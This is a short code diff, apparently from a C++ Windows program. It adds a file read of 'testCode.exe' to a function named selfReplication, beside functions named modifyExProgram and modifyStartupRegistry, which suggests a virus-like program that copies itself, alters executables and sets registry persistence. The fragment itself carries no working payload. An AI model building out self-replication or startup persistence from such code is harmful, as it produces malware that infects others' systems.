@@ -276,6 +276,9 @@ void modifyExProgram() {
 void selfReplication() {
 	//testCode.exe
 	HANDLE hOpenFile = (HANDLE)CreateFile(L"testCode.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
+	BYTE buffer[0x1000];
+	DWORD bytesRead;
+	ReadFile(hOpenFile, buffer, 0x1000, &bytesRead, nullptr);
 	CloseHandle(hOpenFile);
 }
 void modifyStartupRegistry() {
